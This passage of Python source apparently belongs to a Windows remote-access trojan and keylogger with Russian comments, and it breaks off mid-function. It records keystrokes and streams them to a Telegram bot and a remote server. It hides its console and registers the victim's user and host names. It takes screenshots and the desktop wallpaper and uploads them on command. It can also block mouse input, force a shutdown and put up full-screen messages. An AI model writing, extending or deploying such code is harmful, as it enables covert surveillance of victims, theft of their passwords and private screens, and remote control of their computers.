    if (now - _layout_cache['last_check']) < 0.05:
        return _layout_cache['is_ru']
    try:
        user32 = ctypes.windll.user32
        try:
            hwnd = user32.GetForegroundWindow()
            if hwnd == 0:
                hwnd = user32.GetDesktopWindow()
            pid = ctypes.c_ulong(0)
            thread_id = user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            layout_id = user32.GetKeyboardLayout(thread_id)
            lang_id = layout_id & 0xFFFF
            if lang_id:
                is_russian = (lang_id == 0x0419)
                _layout_cache['is_ru'] = is_russian
                globals()['current_layout_is_ru'] = is_russian
                _layout_cache['last_check'] = now
                return is_russian
        except Exception:
            pass
        try:
            buf = ctypes.create_unicode_buffer(9)
            if user32.GetKeyboardLayoutNameW(buf):
                klid = buf.value.upper()
                if '0419' in klid:
                    _layout_cache['is_ru'] = True
                    globals()['current_layout_is_ru'] = True
                    _layout_cache['last_check'] = now
                    return True
                if '0409' in klid:
                    _layout_cache['is_ru'] = False
                    globals()['current_layout_is_ru'] = False
                    _layout_cache['last_check'] = now
                    return False
        except Exception:
            pass
        _layout_cache['last_check'] = now
        return False
    except Exception:
        _layout_cache['last_check'] = now
        return False

def keyboard_layout_monitor():
    try:
        last = get_current_keyboard_layout()
        while True:
            time.sleep(0.5)  # Fast layout monitoring for responsive language switch
            try:
                cur = get_current_keyboard_layout()
                if cur != last:
                    # Только логируем, не отправляем событие в бота
                    logging.info("Layout monitor: обнаружена смена раскладки")
                    last = cur
            except Exception:
                pass
    except Exception:
        logging.exception("keyboard_layout_monitor failed")

def toggle_bot_layout():
    global bot_layout_ru
    bot_layout_ru = not bot_layout_ru
    logging.info(f"Bot layout toggled -> {'RU' if bot_layout_ru else 'EN'} (OS layout unchanged)")

def map_char_by_bot_layout(ch: str) -> str:
    try:
        # Make sure initial bot layout matches current OS layout on first key
        if not globals().get('bot_layout_initialized', False):
            is_ru = bool(get_current_keyboard_layout())
            globals()['bot_layout_ru'] = is_ru
            globals()['bot_layout_initialized'] = True
            logging.info(f"Init bot layout from OS on first key: {'RU' if is_ru else 'EN'}")
    except Exception:
        pass
    # If bot layout is RU, convert ASCII to Cyrillic; if EN, convert Cyrillic to ASCII
    if not ch or len(ch) != 1:
        return ch
    if globals().get('current_layout_is_ru', False):
        # Map only ASCII letters, leave punctuation (like '.') unchanged
        if ch.isascii() and ch.isalpha():
            return EN_TO_RU.get(ch, ch)
        return ch
    # EN: map only Cyrillic letters back to EN; keep punctuation
    if ch in RU_LETTERS:
        return RU_TO_EN.get(ch, ch)
    return ch

def send_to_bot(data, chat_id):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        payload = {'chat_id': chat_id, 'text': f'/keylog {data}'}
        response = requests.post(url, json=payload)
        print(f'Sent to bot: {response.status_code}')
        return response.status_code == 200
    except Exception as e:
        print(f'Error sending to bot: {e}')
        return False

def toggle_sound(mute=True):
    """Управление звуком - УНИВЕРСАЛЬНЫЙ метод для Windows"""
    try:
        logging.info("="*50)
        logging.info("🔊 TOGGLE_SOUND ВЫЗВАН!")
        logging.info("="*50)
        
        success = False
        
        # Метод 1: keyboard библиотека (самый надежный)
        try:
            logging.info("Метод 1: Пробую keyboard.press_and_release...")
            import keyboard as kb
            kb.press_and_release('volume mute')
            logging.info("✅ Звук переключен через keyboard")
            print("\n🔇 ЗВУК ПЕРЕКЛЮЧЕН через keyboard\n")
            success = True
            return True
        except ImportError:
            logging.warning("⚠️ keyboard библиотека не установлена")
        except Exception as e:
            logging.warning(f"⚠️ keyboard failed: {e}")
        
        # Метод 2: pynput (если keyboard не сработал)
        if not success:
            try:
                logging.info("Метод 2: Пробую pynput.Key.media_volume_mute...")
                from pynput.keyboard import Key, Controller
                kb = Controller()
                kb.press(Key.media_volume_mute)
                kb.release(Key.media_volume_mute)
                logging.info("✅ Звук переключен через pynput")
                print("\n🔇 ЗВУК ПЕРЕКЛЮЧЕН через pynput\n")
                success = True
                return True
            except ImportError:
                logging.warning("⚠️ pynput не установлен")
            except Exception as e:
                logging.warning(f"⚠️ pynput failed: {e}")
        
        # Метод 3: ctypes keybd_event
        if not success:
            try:
                logging.info("Метод 3: Пробую ctypes.windll.user32.keybd_event...")
                import ctypes
                import time
                
                VK_VOLUME_MUTE = 0xAD
                
                # Нажатие
                ctypes.windll.user32.keybd_event(VK_VOLUME_MUTE, 0, 0, 0)
                time.sleep(0.05)  # Задержка
                # Отпускание
                ctypes.windll.user32.keybd_event(VK_VOLUME_MUTE, 0, 2, 0)
                
                logging.info("✅ Звук переключен через ctypes")
                print("\n🔇 ЗВУК ПЕРЕКЛЮЧЕН через ctypes\n")
                success = True
                return True
            except Exception as e:
                logging.warning(f"⚠️ ctypes failed: {e}")
        
        # Метод 4: PowerShell (последняя попытка)
        if not success:
            try:
                logging.info("Метод 4: Пробую PowerShell SendKeys...")
                import subprocess
                ps_cmd = "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"
                result = subprocess.run(
                    ['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
                    capture_output=True,
                    timeout=5,
                    text=True
                )
                
                if result.returncode == 0:
                    logging.info("✅ Звук переключен через PowerShell")
                    print("\n🔇 ЗВУК ПЕРЕКЛЮЧЕН через PowerShell\n")
                    success = True
                    return True
                else:
                    logging.warning(f"⚠️ PowerShell returned code {result.returncode}")
                    if result.stderr:
                        logging.warning(f"PowerShell stderr: {result.stderr[:200]}")
            except Exception as e:
                logging.warning(f"⚠️ PowerShell failed: {e}")
        
        # Если ВСЕ методы не сработали
        if not success:
            logging.error("="*50)
            logging.error("❌ НЕ УДАЛОСЬ ПЕРЕКЛЮЧИТЬ ЗВУК!")
            logging.error("Все методы недоступны")
            logging.error("="*50)
            print("\n" + "="*50)
            print("❌ ОШИБКА: Не удалось переключить звук")
            print("Все методы (keyboard, pynput, ctypes, PowerShell) не сработали")
            print("="*50 + "\n")
            return False
        
    except Exception as e:
        logging.error(f"❌ КРИТИЧЕСКАЯ ошибка toggle_sound: {e}")
        import traceback
        traceback.print_exc()
        return False

class DeviceManager:
    def __init__(self):
        self.chat_id = None
        self.registered = False
    def register_device(self):
        try:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates'
            response = requests.get(url).json()
            if 'result' in response and len(response['result']) > 0:
                last_update = response['result'][-1]
                if 'message' in last_update:
                    chat_id = last_update['message']['chat']['id']
                    self.chat_id = chat_id
                    return chat_id
        except Exception as e:
            print(f"Ошибка при получении chat_id: {e}")
        return None
    def send_registration(self, chat_id):
        if chat_id:
            try:
                success = send_to_bot('PC Ready', chat_id)
                if success:
                    print(f"Устройство зарегистрировано для чата {chat_id}")
                    return True
            except Exception as e:
                print(f"Ошибка отправки регистрации: {e}")
        return False

device_manager = DeviceManager()

def check_bot_commands():
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates'
        response = requests.get(url).json()
        if 'result' in response and len(response['result']) > 0:
            for update in response['result']:
                if 'message' in update and 'text' in update['message'] and 'chat' in update['message']:
                    msg_text = update['message']['text']
                    chat_id = update['message']['chat']['id']
                    if msg_text == '/command mute':
                        toggle_sound(True)
                    elif msg_text == '/command unmute':
                        toggle_sound(False)
                    if not hasattr(check_bot_commands, 'target_chat_id'):
                        check_bot_commands.target_chat_id = chat_id
                        send_to_bot('PC Ready', chat_id)
                    update_id = update['update_id']
                    requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={update_id + 1}')
    except Exception as e:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def hide_console_window():
    if not HAS_WIN32GUI:
        return
    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except Exception:
        pass

def _mk_device_identity():
    host = socket.gethostname()
    try:
        user = getpass.getuser()
    except Exception:
        user = "user"
    default_name = user
    default_id = f"{user}-{host}"
    device_id = os.getenv("DEVICE_ID", default_id)
    device_name = os.getenv("DEVICE_NAME", default_name)
    return device_id, device_name

DEVICE_ID, DEVICE_NAME = _mk_device_identity()

event_queue: "queue.Queue[dict]" = queue.Queue()
last_state = {
    "sending_enabled": False,
    "muted": False,
    "chat_ready": False,
    "chat_id": None,
}
last_applied_mute = None
fallback_mute_assumed = None

# Global offline mode flag
bot_offline_mode = False
consecutive_send_failures = 0

def send_event_worker():
    global bot_offline_mode, consecutive_send_failures
    pending_keys = ""
    last_key_ts = 0.0
    last_flush_ts = 0.0
    MAX_CHUNK = 150
    IDLE_FLUSH_SEC = 0.01
    ACTIVE_FLUSH_SEC = 0.025
    FLUSH_CHARS = set(" .,;:!?-()[]{}\"'\n\t")
    while True:
        try:
            ev = event_queue.get(timeout=0.003)
        except queue.Empty:
            ev = None
        now = time.time()
        
        # Skip sending if in offline mode
        if bot_offline_mode:
            if ev is None:
                continue
            # Still process events but don't send
            if ev.get("type") == "key":
                continue
            continue
        
        if ev is None:
            if pending_keys and ((now - last_key_ts) >= IDLE_FLUSH_SEC or (now - last_flush_ts) >= ACTIVE_FLUSH_SEC):
                try:
                    requests.post(
                        f"{BOT_BASE_URL}/event",
                        json={"type": "key", "char": pending_keys, "device_id": DEVICE_ID},
                        timeout=2.0,
                    )
                    consecutive_send_failures = 0
                except Exception as e:
                    consecutive_send_failures += 1
                    if consecutive_send_failures <= 5:
                        logging.warning(f"Failed to send keys: {e}")
                    if consecutive_send_failures >= 10:
                        bot_offline_mode = True
                        logging.warning("")
                        logging.warning("═" * 60)
                        logging.warning("  ⚠️  BOT OFFLINE - Прекращаю отправку событий")
                        logging.warning("═" * 60)
                        logging.warning("")
                pending_keys = ""
                last_flush_ts = now
            continue
        t = ev.get("type")
        if t == "key":
            ch = ev.get("char") or ""
            if ch:
                pending_keys += ch
                last_key_ts = now
                if ch in FLUSH_CHARS or len(pending_keys) >= MAX_CHUNK or (now - last_flush_ts) >= ACTIVE_FLUSH_SEC:
                    try:
                        requests.post(
                            f"{BOT_BASE_URL}/event",
                            json={"type": "key", "char": pending_keys, "device_id": DEVICE_ID},
                            timeout=2.0,
                        )
                        consecutive_send_failures = 0
                    except Exception as e:
                        consecutive_send_failures += 1
                        if consecutive_send_failures <= 5:
                            logging.warning(f"Failed to send keys: {e}")
                        if consecutive_send_failures >= 10:
                            bot_offline_mode = True
                            logging.warning("")
                            logging.warning("═" * 60)
                            logging.warning("  ⚠️  BOT OFFLINE - Прекращаю отправку событий")
                            logging.warning("═" * 60)
                            logging.warning("")
                    pending_keys = ""
                    last_flush_ts = now
            continue
        if pending_keys:
            try:
                requests.post(
                    f"{BOT_BASE_URL}/event",
                    json={"type": "key", "char": pending_keys, "device_id": DEVICE_ID},
                    timeout=2.0,
                )
                consecutive_send_failures = 0
            except Exception as e:
                consecutive_send_failures += 1
                if consecutive_send_failures <= 5:
                    logging.warning(f"Failed to flush keys: {e}")
            pending_keys = ""
        try:
            ev.setdefault("device_id", DEVICE_ID)
            requests.post(f"{BOT_BASE_URL}/event", json=ev, timeout=3.0)
            consecutive_send_failures = 0
        except Exception as e:
            consecutive_send_failures += 1
            if consecutive_send_failures <= 5:
                logging.error(f"Failed to send event {ev.get('type')}: {e}")

def post_event(ev_type: str, ch: Optional[str] = None):
    if ev_type == "key":
        if not ch:
            return
        event_queue.put({"type": "key", "char": ch, "device_id": DEVICE_ID})
    elif ev_type in ("enter", "backspace", "delete", "ctrl_backspace", "ctrl_delete", "lang"):
        event_queue.put({"type": ev_type, "device_id": DEVICE_ID})

def register_loop():
    registration_count = 0
    consecutive_failures = 0
    offline_mode = False
    last_error_log_time = 0
    
    while True:
        try:
            webcams_str = ",".join(str(i) for i in WEBCAM_INDICES) if WEBCAM_INDICES else ""
            payload = {"device_id": DEVICE_ID, "name": DEVICE_NAME, "has_webcam": HAS_WEBCAM, "webcams": webcams_str}
            registration_count += 1
            r = requests.post(f"{BOT_BASE_URL}/register", json=payload, timeout=3.0)
            if r.ok:
                # Успешная регистрация - выходим из offline режима
                if offline_mode or consecutive_failures > 0:
                    logging.info("✅ Регистрация на сервере бота восстановлена!")
                    offline_mode = False
                    # Update global flag
                    global bot_offline_mode, consecutive_send_failures
                    bot_offline_mode = False
                    consecutive_send_failures = 0
                consecutive_failures = 0
                if registration_count % 15 == 0:  # Log every minute
                    logging.info(f"✅ Device registered successfully (count: {registration_count})")
            else:
                consecutive_failures += 1
                if not offline_mode:
                    logging.warning(f"❌ Registration failed: HTTP {r.status_code}")
        except Exception as e:
            consecutive_failures += 1
            current_time = time.time()
            
            # Логируем ошибки только в начале или раз в минуту
            if not offline_mode:
                if consecutive_failures <= 3:
                    logging.warning(f"❌ Registration failed: {e}")
                last_error_log_time = current_time
            elif current_time - last_error_log_time >= 60:
                logging.debug(f"⚠️ Регистрация всё ещё недоступна (offline режим)")
                last_error_log_time = current_time
            
            # После 10 ошибок - переходим в offline режим
            if consecutive_failures >= 10 and not offline_mode:
                offline_mode = True
        
        # Интервал между попытками регистрации
        if offline_mode:
            time.sleep(30.0)  # OFFLINE: редкие попытки
        elif consecutive_failures > 0 and consecutive_failures <= 10:
            time.sleep(1.0)  # Быстрые повторы при начальных проблемах
        else:
            time.sleep(2.0)  # Нормальный интервал регистрации

volume_iface = None

def init_volume_iface():
    global volume_iface
    if not HAS_PYCAW:
        try:
            logging.warning("HAS_PYCAW=False, pycaw not available")
        except Exception:
            pass
        return
    try:
        logging.info("🔊 Attempting pycaw initialization...")
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        # Инициализируем COM
        try:
            from comtypes import CoInitialize
            CoInitialize()
        except Exception:
            pass
        
        # Простой способ через GetSpeakers() -> Activate
        devices = AudioUtilities.GetSpeakers()
        
        # Проверяем есть ли метод Activate
        if hasattr(devices, 'Activate'):
            # Старый API - работает
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_iface = cast(interface, POINTER(IAudioEndpointVolume))
            test_mute = volume_iface.GetMute()
            logging.info(f"✅ pycaw OK (old API)! Current mute: {test_mute}")
        else:
            # Новый API - нужен другой подход
            logging.warning("⚠️ AudioDevice.Activate not available - trying direct COM approach")
            
            # Прямой доступ через COM
            from comtypes import CoCreateInstance, GUID
            from ctypes import POINTER
            
            # CLSID для IMMDeviceEnumerator
            CLSID_MMDeviceEnumerator = GUID('{BCDE0395-E52F-467C-8E3D-C4579291692E}')
            
            # IMMDeviceEnumerator interface
            from pycaw.pycaw import IMMDeviceEnumerator, EDataFlow, ERole
            
            deviceEnumerator = CoCreateInstance(
                CLSID_MMDeviceEnumerator,
                IMMDeviceEnumerator,
                CLSCTX_ALL
            )
            
            defaultDevice = deviceEnumerator.GetDefaultAudioEndpoint(
                EDataFlow.eRender.value,
                ERole.eMultimedia.value
            )
            
            interface = defaultDevice.Activate(
                IAudioEndpointVolume._iid_,
                CLSCTX_ALL,
                None
            )
            
            volume_iface = cast(interface, POINTER(IAudioEndpointVolume))
            test_mute = volume_iface.GetMute()
            logging.info(f"✅ pycaw OK (new API via COM)! Current mute: {test_mute}")
    except Exception as e:
        logging.error(f"❌ pycaw initialization failed: {e}")
        logging.info("→ Will use fallback (nircmd or simple mute toggle)")
        volume_iface = None

def apply_system_mute(mute: bool):
    global volume_iface, last_applied_mute, fallback_mute_assumed
    try:
        logging.info(f"apply_system_mute: target={'MUTE' if mute else 'UNMUTE'}")
    except Exception:
        pass
    if HAS_PYCAW:
        try:
            logging.info(f"HAS_PYCAW=True, volume_iface={volume_iface}")
        except Exception:
            pass
        if volume_iface is None:
            try:
                logging.info("volume_iface is None, calling init_volume_iface()...")
            except Exception:
                pass
            init_volume_iface()
            try:
                logging.info(f"After init: volume_iface={volume_iface}")
            except Exception:
                pass
        if volume_iface is None:
            try:
                logging.warning("⚠️ pycaw volume_iface is None after init, trying fallbacks...")
            except Exception:
                pass
            # НЕ ДЕЛАЕМ RETURN! Переходим к fallback методам
        else:
            # volume_iface доступен - пробуем SetMute
            try:
                try:
                    cur = bool(volume_iface.GetMute())
                    logging.info(f"Current mute state via pycaw: {cur}")
                except Exception as e:
                    logging.warning(f"Failed to GetMute: {e}")
                    cur = None
                if cur is None or cur != bool(mute):
                    volume_iface.SetMute(1 if mute else 0, None)
                    try:
                        logging.info("✅ apply_system_mute: applied via pycaw SetMute")
                    except Exception:
                        pass
                    return  # Успешно применили через pycaw
                else:
                    try:
                        logging.info("pycaw: mute state already correct, no action needed")
                    except Exception:
                        pass
                    return
            except Exception as e:
                logging.error(f"❌ pycaw SetMute failed: {e}")
        # pycaw не сработал - используем fallback
        logging.info(f"🔊 Fallback: mute={mute} via nircmd or ctypes...")
        try:
            import subprocess
            import os
            
            # Проверяем nircmd (лучший вариант)
            nircmd_paths = [
                os.path.join(os.path.dirname(__file__), 'nircmd.exe'),
                r'C:\Windows\System32\nircmd.exe',
                'nircmd.exe'
            ]
            
            nircmd_found = None
            for path in nircmd_paths:
                if os.path.exists(path):
                    nircmd_found = path
                    break
            
            if nircmd_found:
                # nircmd - АБСОЛЮТНОЕ управление
                if mute:
                    subprocess.run([nircmd_found, 'mutesysvolume', '1'], capture_output=True, timeout=1)
                else:
                    subprocess.run([nircmd_found, 'mutesysvolume', '0'], capture_output=True, timeout=1)
                logging.info(f"✅ Applied mute={mute} via nircmd")
                return
            
            # nircmd нет - используем ctypes VK_VOLUME_MUTE (toggle)
            # Проблема: это toggle, но других вариантов нет
            logging.warning("⚠️ nircmd not found - using toggle (may not work correctly)")
            logging.warning("⚠️ Download nircmd: https://www.nirsoft.net/utils/nircmd.html")
            logging.warning(r"⚠️ Place nircmd.exe in program\ folder for proper mute control")
            
            import ctypes
            VK_VOLUME_MUTE = 0xAD
            
            # Узнаем текущее состояние (через реестр)
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Audio', 0, winreg.KEY_READ)
                current_mute = winreg.QueryValueEx(key, 'MasterMute')[0]
                winreg.CloseKey(key)
            except Exception:
                current_mute = None
            
            # Если состояние уже правильное - не делаем toggle
            if current_mute is not None and bool(current_mute) == bool(mute):
                logging.info(f"✅ Mute already {mute} - no action needed")
                return
            
            # Делаем toggle
            ctypes.windll.user32.keybd_event(VK_VOLUME_MUTE, 0, 0, 0)
            time.sleep(0.02)
            ctypes.windll.user32.keybd_event(VK_VOLUME_MUTE, 0, 2, 0)
            logging.info(f"✅ Toggled mute via ctypes (target was mute={mute})")
            return
            
        except Exception as e:
            logging.error(f"❌ All fallback methods failed: {e}")
    else:
        # HAS_PYCAW=False
        logging.info(f"🔊 No pycaw: using fallback mute={mute}...")
        try:
            import subprocess
            import os
            
            nircmd_paths = [
                os.path.join(os.path.dirname(__file__), 'nircmd.exe'),
                r'C:\Windows\System32\nircmd.exe',
                'nircmd.exe'
            ]
            
            nircmd_found = None
            for path in nircmd_paths:
                if os.path.exists(path):
                    nircmd_found = path
                    break
            
            if nircmd_found:
                if mute:
                    subprocess.run([nircmd_found, 'mutesysvolume', '1'], capture_output=True, timeout=1)
                else:
                    subprocess.run([nircmd_found, 'mutesysvolume', '0'], capture_output=True, timeout=1)
                logging.info(f"✅ nircmd: mute={mute}")
            else:
                logging.warning("⚠️ nircmd not found - using ctypes toggle")
                import ctypes
                VK_VOLUME_MUTE = 0xAD
                
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Audio', 0, winreg.KEY_READ)
                    current_mute = winreg.QueryValueEx(key, 'MasterMute')[0]
                    winreg.CloseKey(key)
                except Exception:
                    current_mute = None
                
                if current_mute is not None and bool(current_mute) == bool(mute):
                    logging.info(f"✅ Mute already {mute}")
                    return
                
                ctypes.windll.user32.keybd_event(VK_VOLUME_MUTE, 0, 0, 0)
                time.sleep(0.02)
                ctypes.windll.user32.keybd_event(VK_VOLUME_MUTE, 0, 2, 0)
                logging.info(f"✅ ctypes toggle (target mute={mute})")
        except Exception as e:
            logging.error(f"❌ Fallback failed: {e}")

def poll_state_loop(update_ui_callback):
    global last_state, last_applied_mute
    while True:
        try:
            r = requests.get(f"{BOT_BASE_URL}/state", params={"device_id": DEVICE_ID}, timeout=3.0)
            if r.ok:
                st = r.json()
                changed = (
                    st.get("sending_enabled") != last_state.get("sending_enabled")
                    or st.get("muted") != last_state.get("muted")
                    or st.get("chat_ready") != last_state.get("chat_ready")
                )
                last_state = {
                    "sending_enabled": bool(st.get("sending_enabled")),
                    "muted": bool(st.get("muted")),
                    "chat_ready": bool(st.get("chat_ready")),
                    "chat_id": st.get("chat_id"),
                }
                if changed:
                    try:
                        logging.info(
                            f"STATE CHANGED: sending_enabled={last_state['sending_enabled']}, muted={last_state['muted']}, chat_ready={last_state['chat_ready']}"
                        )
                    except Exception:
                        pass
                    update_ui_callback(last_state)
                if last_applied_mute is None or last_applied_mute != last_state["muted"]:
                    try:
                        logging.info(f"APPLY MUTE from state: {last_state['muted']}")
                    except Exception:
                        pass
                    apply_system_mute(last_state["muted"])
                    last_applied_mute = last_state["muted"]
        except Exception:
            pass
        time.sleep(0.05)  # ULTRA FAST: 20 запросов в секунду для мгновенной смены раскладки (было 0.5)

def get_current_wallpaper_and_send(chat_id: Optional[int]):
    """Получает текущие обои Windows и отправляет их в бот"""
    try:
        logging.info("📷 Получаю текущие обои Windows...")
        import ctypes
        import os
        
        # Получаем путь к текущим обоям через Windows API
        SPI_GETDESKWALLPAPER = 0x0073
        buffer = ctypes.create_unicode_buffer(512)
        result = ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, len(buffer), buffer, 0)
        
        if not result:
            logging.error("Не удалось получить путь к обоям через SystemParametersInfoW")
            return
        
        wallpaper_path = buffer.value
        logging.info(f"Путь к обоям: {wallpaper_path}")
        
        if not wallpaper_path or not os.path.exists(wallpaper_path):
            logging.error(f"Файл обоев не найден: {wallpaper_path}")
            return
        
        # Читаем файл обоев
        try:
            with open(wallpaper_path, 'rb') as f:
                wallpaper_data = f.read()
            
            file_size_mb = len(wallpaper_data) / (1024 * 1024)
            logging.info(f"Размер файла обоев: {file_size_mb:.2f} МБ")
            
            # Отправляем на бот
            file_ext = os.path.splitext(wallpaper_path)[1] or '.jpg'
            filename = f"wallpaper{file_ext}"
            
            response = requests.post(
                f"{BOT_BASE_URL}/current_wallpaper",
                data={"device_id": DEVICE_ID},
                files={"file": (filename, wallpaper_data)},
                timeout=30.0,
            )
            
            if response.ok:
                logging.info("✅ Обои успешно отправлены в бот")
            else:
                logging.error(f"Ошибка отправки обоев: HTTP {response.status_code}")
                
        except Exception as e:
            logging.error(f"Ошибка чтения файла обоев: {e}")
            
    except Exception as e:
        logging.exception(f"Критическая ошибка в get_current_wallpaper_and_send: {e}")

def capture_and_send_screenshot(chat_id: Optional[int]):
    try:
        import io
        img = None
        logging.info("Начинаю захват скриншота...")
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            logging.info(f"Скриншот захвачен через PIL.ImageGrab: {img.size}")
        except Exception as e:
            logging.warning(f"PIL.ImageGrab failed: {e}")
            img = None
        if img is None and HAS_PYAUTOGUI:
            try:
                img = pyautogui.screenshot()
                logging.info(f"Скриншот захвачен через pyautogui: {img.size if img else 'None'}")
            except Exception as e:
                logging.warning(f"pyautogui.screenshot failed: {e}")
                img = None
        if img is None:
            try:
                import mss
                with mss.mss() as sct:
                    mon = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                    shot = sct.grab(mon)
                    img = Image.frombytes('RGB', shot.size, shot.rgb)
                    logging.info(f"Скриншот захвачен через mss: {img.size}")
            except Exception as e:
                logging.warning(f"mss failed: {e}")
                img = None
        if img is None:
            logging.error("Не удалось захватить скриншот ни одним методом!")
            return
        if hasattr(img, 'mode') and img.mode != 'RGB':
            img = img.convert('RGB')
        try:
            max_w, max_h = 1920, 1080
            w, h = img.size
            if w > max_w or h > max_h:
                ratio = min(max_w / float(w), max_h / float(h))
                new_size = (int(w * ratio), int(h * ratio))
                img = img.resize(new_size, Image.LANCZOS)
                logging.info(f"Скриншот уменьшен до {new_size} для быстрой отправки")
        except Exception as e:
            logging.warning(f"Не удалось уменьшить изображение: {e}")
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=85, optimize=True, subsampling=2)
        buf.seek(0)
        logging.info(f"Изображение закодировано в JPEG, размер: {len(buf.getvalue())} байт")
        try:
            response = requests.post(
                f"{BOT_BASE_URL}/screenshot",
                data={"device_id": DEVICE_ID},
                files={"file": ("screenshot.jpg", buf, "image/jpeg")},
                timeout=15.0,
            )
            if response.ok:
                logging.info("Скриншот успешно отправлен на бот")
            else:
                logging.error(f"Ошибка отправки скриншота: HTTP {response.status_code}")
        except Exception as e:
            logging.error(f"Не удалось отправить скриншот: {e}")
    except Exception as e:
        logging.exception(f"Критическая ошибка в capture_and_send_screenshot: {e}")

mouse_blocked = False
mouse_block_thread = None

def block_mouse_thread():
    while mouse_blocked:
        try:
            scr_w = ctypes.windll.user32.GetSystemMetrics(0)
            scr_h = ctypes.windll.user32.GetSystemMetrics(1)
            cx, cy = int(scr_w)//2, int(scr_h)//2
            ctypes.windll.user32.SetCursorPos(cx, cy)
        except Exception:
            pass
        time.sleep(0.01)

def block_mouse():
    global mouse_blocked, mouse_block_thread
    if not mouse_blocked:
        mouse_blocked = True
        try:
            ctypes.windll.user32.BlockInput(True)
        except Exception:
            pass
        try:
            class RECT(ctypes.Structure):
                _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long), ("right", ctypes.c_long), ("bottom", ctypes.c_long)]
            scr_w = ctypes.windll.user32.GetSystemMetrics(0)
            scr_h = ctypes.windll.user32.GetSystemMetrics(1)
            cx, cy = int(scr_w)//2, int(scr_h)//2
            rect = RECT(cx, cy, cx+1, cy+1)
            ctypes.windll.user32.ClipCursor(ctypes.byref(rect))
        except Exception:
            pass
        mouse_block_thread = threading.Thread(target=block_mouse_thread, daemon=True)
        mouse_block_thread.start()
        threading.Timer(15.0, unblock_mouse).start()
        logging.info("Мышь заблокирована")

def unblock_mouse():
    global mouse_blocked, mouse_block_thread
    if mouse_blocked:
        mouse_blocked = False
        try:
            ctypes.windll.user32.BlockInput(False)
        except Exception:
            pass
        try:
            ctypes.windll.user32.ClipCursor(None)
        except Exception:
            pass
        mouse_block_thread = None
        logging.info("Мышь разблокирована")

def shutdown_pc():
    try:
        logging.info("Выключение ПК...")
        subprocess.run(['shutdown', '/s', '/t', '0'], check=False)
    except Exception as e:
        logging.error(f"Ошибка выключения: {e}")

def show_overlay_text(text: str, timeout_ms: int = 5000):
    """Показывает текст поверх всех окон (полноэкранный оверлей)"""
    try:
        if not text:
            return
        
        def _worker():
            # Метод 1: Пробуем tkinter
            try:
                import tkinter as tk
                from tkinter import font as tkfont
                
                # Создаем root окно
                root = tk.Tk()
                root.title("Overlay")
                
                # Настройки окна для полноэкранного оверлея
                try:
                    # Убираем рамку окна
                    root.overrideredirect(True)
                    # Всегда поверх всех окон
                    root.attributes('-topmost', True)
                    # Прозрачность фона (только на Windows 10/11)
                    try:
                        root.attributes('-transparentcolor', 'black')
                        root.wm_attributes('-alpha', 0.85)  # Полупрозрачный фон
                    except:
                        pass
                    # Черный фон
                    root.configure(bg='black')
                except Exception as e:
                    logging.debug(f"Window config error: {e}")
                
                # Получаем размеры экрана и делаем полноэкранным
                try:
                    screen_width = root.winfo_screenwidth()
                    screen_height = root.winfo_screenheight()
                    root.geometry(f"{screen_width}x{screen_height}+0+0")
                except Exception:
                    # Fallback на стандартные размеры
                    root.geometry("1920x1080+0+0")
                    screen_width = 1920
                
                # Создаем фрейм с текстом
                frame = tk.Frame(root, bg='black')
                frame.pack(expand=True, fill='both')
                
                # Создаем метку с текстом
                try:
                    # Большой жирный шрифт
                    text_font = tkfont.Font(family='Segoe UI', size=36, weight='bold')
                    
                    label = tk.Label(
                        frame,
                        text=text,
                        font=text_font,
                        fg='white',
                        bg='black',
                        wraplength=int(screen_width * 0.85),  # Перенос текста
                        justify='center',
                        padx=50,
                        pady=50
                    )
                    label.pack(expand=True)
                except Exception as e:
                    # Fallback без fancy шрифтов
                    label = tk.Label(
                        frame,
                        text=text,
                        font=('Arial', 32, 'bold'),
                        fg='white',
                        bg='black',
                        justify='center'
                    )
                    label.pack(expand=True)
                
                # Закрытие окна через timeout
                def close_overlay():
                    try:
                        root.quit()
                        root.destroy()
                    except Exception:
                        pass
                
                # Закрытие по клику мыши (для удобства)
                def on_click(event):
                    close_overlay()
                
                root.bind('<Button-1>', on_click)
                
                # Автоматическое закрытие через timeout
                timeout = max(1000, int(timeout_ms or 5000))
                root.after(timeout, close_overlay)
                
                # Запускаем главный цикл
                try:
                    root.mainloop()
                except Exception as e:
                    logging.debug(f"Mainloop error: {e}")
                finally:
                    try:
                        root.destroy()
                    except:
                        pass
                    
            except ImportError as e:
                # tkinter не установлен - используем альтернативные методы
                logging.warning(f"⚠️ tkinter недоступен: {e}")
                logging.info("💡 tkinter - это стандартная библиотека Python")
                logging.info("💡 Для установки: переустановите Python с опцией 'tcl/tk and IDLE'")
                logging.info("💡 Используется альтернативный метод отображения...")
                
                # Метод 2: Windows Toast Notification
                try:
                    from win10toast import ToastNotifier
                    toaster = ToastNotifier()
                    toaster.show_toast(
                        "Сообщение",
                        text,
                        duration=int(timeout_ms / 1000),
                        threaded=True
                    )
                    logging.info("✅ Текст показан через Toast Notification")
                    return
                except Exception as toast_err:
                    logging.debug(f"Toast notification failed: {toast_err}")
                
                # Метод 3: Windows MessageBox (блокирующий, но работает всегда)
                try:
                    import ctypes
                    # MB_OK | MB_TOPMOST | MB_SETFOREGROUND
                    MB_OK = 0x0
